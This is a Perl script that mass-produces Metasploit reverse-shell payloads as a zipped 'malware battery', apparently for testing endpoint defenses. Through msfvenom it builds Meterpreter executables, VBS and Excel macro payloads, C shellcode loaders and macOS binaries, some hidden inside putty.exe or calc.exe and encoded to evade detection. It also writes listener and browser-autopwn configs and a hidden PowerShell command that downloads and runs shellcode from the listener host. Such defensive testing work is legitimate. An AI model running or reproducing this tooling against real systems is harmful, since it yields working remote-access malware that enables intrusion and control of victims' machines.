#!/usr/bin/perl
use strict;
use warnings;

  my($LHOST, $LPORT, $PROJECT, $PROJECTNUM);
  my($fileNdx,  $targetFolder, $IoE);
  my($payload, $platform_arch , $commandControl );
  my($currentFileName, $encoder,$cmd, $OUTFILE);
  my($archiveFolder);
  my($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst);

  $LHOST = shift or die "Expecting an IP address in arg 1";  
  $LPORT = shift or die "Expecting a TCP Port address in arg 2";  
  $PROJECT = shift or die "Expecting a Project Name in arg 3"; 
  $PROJECTNUM = shift or die "Expecting a Project Number in arg 4";
 
  #define the target folder and ensure it exists
  $targetFolder="/opt/malwaredefense/current";
  `mkdir -p $targetFolder`;
 
  $fileNdx=0;
  $commandControl = "lhost=$LHOST lport=$LPORT";

  #archive the old version
  ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();
  $archiveFolder="/opt/malwaredefense/archive" . (${year} + 1900) . sprintf("%02d",(${mon}+1)) . sprintf("%02d",${mday});
  $archiveFolder.= "_" . sprintf("%02d",${hour}). sprintf("%02d",${min}). sprintf("%02d",${sec});
  `mkdir -p $archiveFolder`;
  `mv $targetFolder/* $archiveFolder/`;

  ###################
  ##
  ##  32 bit Basic Delivery
  ##
  ##################

  `touch $targetFolder/000-StartMSF900.cue`;
  $payload = 'windows/meterpreter/reverse_tcp';
  $platform_arch = '--platform win -ax86';
  $encoder = "-e generic/none";


  open( $OUTFILE, '>', "$targetFolder/900-reverse_tcp_noenc-32.rc");
print $OUTFILE <<TCPNOENC;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding false
exploit -j
TCPNOENC
  close $OUTFILE;

 
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/001-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-32.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/002-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-packed-putty-32.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;

  
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/003-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-32.vbs";
  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/004-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-32.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;






  ###################
  ##
  ##  32 bit Basic Delivery + Encoding
  ##
  ##################
  
  $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';
  $payload = 'windows/meterpreter/reverse_tcp';
  $platform_arch = '--platform win -ax86';
  
  #continue to use previous listener

  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/011-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-32enc.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/012-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-packed-putty-32enc.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;


   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/013-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-32enc.vbs";
   print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;


  #tuning encoder down to 1 for VBA
  #consistently had issues with this running.
  $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/014-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-32enc.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;

  `touch $targetFolder/050-${PROJECT}-${PROJECTNUM}-RepeatWith905.cue`;

 open( $OUTFILE, '>', "$targetFolder/905-reverse_tcp-enc-32.rc");
print $OUTFILE <<TCPENC;
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
TCPENC
  close $OUTFILE;







  ###################
  ##
  ##  32 bit Stageless Delivery
  ##
  ##################

  `touch $targetFolder/060-StartMSF980.cue`;
  $payload = "windows/meterpreter_reverse_tcp";
  $encoder = "";
  $platform_arch = '--platform win -ax86';

  open( $OUTFILE, '>', "$targetFolder/980-stageless-reverse_tcp-enc-32.rc");
print $OUTFILE <<TCPSTAGELESS32;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
TCPSTAGELESS32
  close $OUTFILE;


  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/061-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/062-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-packed-putty-32.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;


  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/063-${PROJECT}-${PROJECTNUM}-StaglessMeterpreter-32.vbs";
  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/064-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;


  ###################
  ##
  ##  32 bit Stageless Delivery + Encoding
  ##
  ##################
  $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';
  $payload = 'windows/meterpreter_reverse_tcp';

  #continue using previous listener
  
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/071-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32enc.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/072-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-packed-putty-32enc.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;


   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/073-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32enc.vbs";
   print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;


  #tuning encoder down to 1 for VBA
  #consistently had issues with this running.
  $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/074-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32enc.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;






  ###################
  ##
  ##  64bit Basic Delivery 
  ##
  ##################


  $platform_arch = '--platform win -ax86_64';
  $payload = 'windows/x64/meterpreter/reverse_tcp';
  $encoder = ''; 
  
  `touch $targetFolder/100-StartMSF910.cue`;


  open( $OUTFILE, '>', "$targetFolder/910-reverse_tcp-noenc-64.rc");
print $OUTFILE <<TCPNOENC64;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding false
exploit -j
TCPNOENC64
  close $OUTFILE;
 

  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/101-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-64.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/102-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-calc-64.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;


  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/103-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vbs";
  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/104-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;

  ###################
  ##
  ##  64bit Basic Delivery + Encoding
  ##
  ##################

  $encoder ='-e x64/xor -i 3';
  $payload = 'windows/x64/meterpreter/reverse_tcp';

  #Continue using previous listener

  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/111-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-64enc.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/112-${PROJECT}-${PROJECTNUM}-PackedMeterpreter-calc-64enc.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;


  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/113-${PROJECT}-${PROJECTNUM}-Meterpreter-64enc.vbs";
  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/114-${PROJECT}-${PROJECTNUM}-Meterpreter-64enc.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;


  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/115-${PROJECT}-${PROJECTNUM}-CShellCode-64enc.c";
  print "\n\n*** 64 Bit Meterpreter C Shell Code, XOR encoded: $cmd\n";
  `$cmd`;
  #`cp ./inc/meterpreter_x64enc.c $targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterTemplate.c`;
  #`echo "#!/bin/sh" >$targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterGen.sh`;
  #`echo "x86_64-w64-mingw32-gcc 115-${PROJECT}-${PROJECTNUM}-MeterpreterTemplate.c  -o 115-${PROJECT}-${PROJECTNUM}-Meterpreter-CustomTemplate.exe" >>$targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterGen.sh`;
  #`chmod +x $targetFolder/115-${PROJECT}-${PROJECTNUM}-MeterpreterGen.sh`;
 &createShellcodeEXEFromTemplate(631,"$targetFolder/115-${PROJECT}-${PROJECTNUM}-CShellCode-64enc.c");

  `touch $targetFolder/150-${PROJECT}-${PROJECTNUM}-RepeatWith915.cue`;




  open( $OUTFILE, '>', "$targetFolder/915-reverse_tcp-enc-64.rc");
print $OUTFILE <<TCPENC64;
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
TCPENC64
  close $OUTFILE;



  ###################
  ##
  ##  64bit Stageless Delivery
  ##
  ##################


  $platform_arch = '--platform win -ax86_64';
  $payload = 'windows/x64/meterpreter_reverse_tcp';
  $encoder = '';

  `touch $targetFolder/160-StartMSF990.cue`;

  open( $OUTFILE, '>', "$targetFolder/990-stageless-reverse_tcp-enc-64.rc");
print $OUTFILE <<TCPSTAGELESS64;
use multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
TCPSTAGELESS64
  close $OUTFILE;



  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/161-${PROJECT}-${PROJECTNUM}-BasicMeterpreter-64.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/162-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-calc-64.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;


  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/163-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vbs";
  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/164-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;


  ###################
  ##
  ##  64bit Stageless Delivery + Encoding
  ##
  ##################

  $encoder ='-e x64/xor -i 3';
  $payload = 'windows/x64/meterpreter_reverse_tcp';

  #Continue using previous listener

  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/171-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-64enc.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/172-${PROJECT}-${PROJECTNUM}-PackedStagelessMeterpreter-calc-64enc.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;


  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/173-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-64enc.vbs";
  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/174-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-64enc.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;


  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/175-${PROJECT}-${PROJECTNUM}-CShellCode-64enc.c";
  print "\n\n*** Meterpreter vba  C Shell Code: $cmd\n";
  `$cmd`;
  `cp ./inc/stagelessmeterpreter_x64enc.c $targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterTemplate.c`;
  `echo "#!/bin/sh" >$targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterGen.sh`;
  `echo "x86_64-w64-mingw32-gcc 175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterTemplate.c  -o 175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-CustomTemplate.exe" >>$targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterGen.sh`;
  `chmod +x $targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessMeterpreterGen.sh`;


  $payload = 'windows/x64/meterpreter/reverse_tcp';











  ###################
  ##
  ##  Powershell HTTPS
  ##
  ##################

  `touch $targetFolder/200-${PROJECT}-${PROJECTNUM}-Run950.cue`;
  open( $OUTFILE, '>', "$targetFolder/950-reversehttps.rc");
print $OUTFILE <<RHTTPSNOENC;
use multi/handler
set payload windows/meterpreter/reverse_https
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding false
exploit -j
RHTTPSNOENC
  close $OUTFILE;


  print "Copy the Invoke-shellcode.ps1 to the target directory \n";
  print "Checking if PowerSploit is installed... \n";
  if (-d "/opt/PowerSploit") {
    print "PowerSploit is already installed \n";
  }
  else {
    print "Installing PowerSploit now in /opt/ \n";
    `cd /opt/ && git clone https://github.com/mattifestation/PowerSploit.git > /dev/null 2>&1 && cd /opt/PowerSploit/ && wget -q https://raw.githubusercontent.com/obscuresec/random/master/StartListener.py && wget -q https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py`;
  }
  my ($ShellCodePath) ="./inc/Invoke-Shellcode.ps1";
  `cp $ShellCodePath $targetFolder/202-Invoke-Shellcode.ps1`;
  `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $targetFolder/202-Invoke-Shellcode.ps1`;
  $cmd = "powershell.exe -NoP -NonI -w HIDDEN -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST/202-Invoke-Shellcode.ps1'))";
  open( $OUTFILE, '>', "$targetFolder/201_PScommand.txt");
  print $OUTFILE $cmd;
  close $OUTFILE;



  ###################
  ##
  ##  Browser Autopwn
  ##
  ##################


  `touch $targetFolder/300-${PROJECT}-${PROJECTNUM}-run960.cue`;

  open( $OUTFILE, '>', "$targetFolder/960-browserautopwn1.rc");
print $OUTFILE <<BAPENC;
use auxiliary/server/browser_autopwn
set SRVHOST $LHOST
set SRVPORT 8080
format(lhost)
set URIPATH qrq
set EnableStageEncoding true
exploit
BAPENC
  close $OUTFILE;






  `touch $targetFolder/300-${PROJECT}-${PROJECTNUM}-run965.cue`;
  open( $OUTFILE, '>', "$targetFolder/965-browserautopwn2.rc");
print $OUTFILE <<BAPENC2;
use auxiliary/server/browser_autopwn2
set SRVHOST $LHOST
set SRVPORT 8080
format(lhost)
set URIPATH qrq
set EnableStageEncoding true
exploit
BAPENC2


  ###################
  ##
  ##  Python
  ##
  ##################
 

  $platform_arch = "--platform Python -a python";
  $encoder = "-e generic/none";
  $payload = "python/meterpreter/reverse_tcp";





 `touch $targetFolder/400-${PROJECT}-${PROJECTNUM}-run970.cue`;
  open( $OUTFILE, '>', "$targetFolder/970-pythonreverse_tcp.rc");
print $OUTFILE <<PYRTCP;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
PYRTCP
  close $OUTFILE;




  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} $encoder > $targetFolder/401-${PROJECT}-${PROJECTNUM}-Meterpreter-python.py";
  print "\n\n*** Meterpreter python: $cmd\n";
  `$cmd`;
  #original: msfvenom -e generic/none --platform Python -a python -p python/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=443 >400-${PROJECT}-${PROJECTNUM}-Python.py



  ###################
  ##
  ##  MAC
  ##
  ##################


  $platform_arch = "--platform OSX -a x86";
  $encoder = '-e generic/none -b "\x00"';
  $payload = "osx/x86/shell_reverse_tcp";

 `touch $targetFolder/500-${PROJECT}-${PROJECTNUM}-run975.cue`;
  open( $OUTFILE, '>', "$targetFolder/975-MacShellReverseTCP.rc");
print $OUTFILE <<MACSHELL1;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
MACSHELL1
  close $OUTFILE;


  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f macho > $targetFolder/501-${PROJECT}-${PROJECTNUM}-shell.macho";
  print "\n\n*** Meterpreter mac: $cmd\n";
  `$cmd`;

  ###################
  ##
  ##  exe masking
  ##
  ##################

  my($originalFile,$maskedFile);
  opendir (DIR, $targetFolder) or die $!;
  while (my $originalFile = readdir(DIR)) {
    $_ = $originalFile;
    if (/cue$/ || /txt$/ ||/sh$/ || /c$/ || /rc$/){next;}
    $maskedFile = $originalFile;
    $maskedFile =~ s/.$/_/;
    `cp $targetFolder/$originalFile $targetFolder/$maskedFile`; 
  }
  closedir(DIR);



  ###################
  ##
  ##  zip it up for USB/Download fast transfer
  ##
  ##################

  `cp /opt/eicar/eicar.com /opt/malwaredefense/current/0001-eicar.com`;
  `cp /opt/eicar/eicar.com.txt /opt/malwaredefense/current/0002-eicar.com.txt`;
  `cp /opt/eicar/eicar.com.txt /opt/malwaredefense/current/0003-eicar.com.jpg`;
  `cp /opt/eicar/eicar_com.zip /opt/malwaredefense/current/0004-eicar.zip`;
  `cp /opt/eicar/eicarcom2.zip /opt/malwaredefense/current/0005-eicar2.zip`;
  `zip -j -r /opt/malwaredefense/current/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip /opt/malwaredefense/current/*`;
  `zip -j -r /opt/malwaredefense/current/999-$PROJECT-$PROJECTNUM-Malware-CurrentBatteryEncrypted.zip /opt/malwaredefense/current/999-$PROJECT-$PROJECTNUM-Malware-CurrentBatteryEncrypted.zip `;






sub createShellcodeEXEFromTemplate{
  my($venomFile, $VENOM, $codeSize, $outCFile, $outEXEFile, $OUTPUT);
  $codeSize = shift;
  $venomFile = shift;
  $outEXEFile = $venomFile;
  $outEXEFile =~ s/c$/exe/;
  $outCFile = $venomFile;
  $outCFile =~ s/\.c$/-FullTemplate.c/;
  open($OUTPUT, ">",$outCFile);
  print $OUTPUT <<SHELL_CODE_TEMPLATE_START;
#include <stdio.h>
#include <windows.h> //VirtualAlloc is defined here
//YOU MUST REPLACE the buf and the size 
SHELL_CODE_TEMPLATE_START
  open($VENOM, "<",$venomFile);
  print $OUTPUT "size_t size = $codeSize; //size of buf in bytes (output by msfvenom)\n\n";
  while(<$VENOM>){
    print $OUTPUT $_;
  }
  close($VENOM);
  print $OUTPUT <<SHELL_CODE_TEMPLATE_END;
int main(int argc, char **argv) {
char *code;                     //Holds a memory address
code = (char *)VirtualAlloc(    //Allocate a chunk of memory and store the starting address
        NULL, size, MEM_COMMIT,     
        PAGE_EXECUTE_READWRITE  //Set the memory to be writable and executable
    );
memcpy(code, buf, size);    //Copy our spud into the executable section of memory
((void(*)())code)();            //Cast the executable memory to a function pointer and run it
return(0);
}
SHELL_CODE_TEMPLATE_END
  close($OUTPUT);
  $outEXEFile = $outCFile;
  $outEXEFile =~ s/c$/exe/;
  $_=$outEXEFile;
  if (/64/){
    `x86_64-w64-mingw32-gcc $outCFile -o $outEXEFile`;
  }else{
    `i686-w64-mingw32-gcc $outCFile  -o $outEXEFile`;
  }
  print "Completed gerneration of $outEXEFile\n";
}






 
#Needs additional work
#  print "\n\n*** Meterpreter Java  (Paste into Java and compile) \n";
#  #`msfvenom -p ${payload} ${platform_arch} ${commandControl} -f java $encoder > ${currentFileName}.java`;
#  `msfvenom -p java/meterpreter/reverse_tcp ${platform_arch} ${commandControl} -f raw $encoder -o ${currentFileName}.jar`;
